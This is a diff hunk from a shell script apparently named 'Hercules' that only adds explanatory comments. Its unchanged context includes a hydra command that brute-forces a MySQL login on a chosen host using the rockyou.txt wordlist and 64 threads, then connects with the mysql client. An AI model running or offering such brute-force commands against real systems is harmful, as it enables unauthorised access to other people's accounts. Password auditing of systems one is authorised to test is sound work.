@@ -59,14 +59,14 @@ if [[ "$OSTYPE" == "darwin"* ]]; then
             
             elif [[ $service == 3306 ]] || [[ $service == "mysql" ]]; then 
                 hydra -l $user -P rockyou.txt -t 64 -vV -o output.log -I mysql://$host #Cracks the chocien persons password for 3306(MySQL)
-                echo "Loading to MySQL server..."
-                sleep 3;
+                echo "Loading to MySQL server..." # tells the user that MySQL is Loading 
+                sleep 3; #makes the program wait for 3 seconds
                 mysql -u $user -p -A #connects to the MySQL server
             fi
         }
         fi
         Hercules; #end of the function of Hercules
 else
-    clear;
+    clear; #clears the terminal
     echo "Wrong OS please use the correct OS." #if the users is not useing the right OS it says "You are useing the wrong OS"
 fi
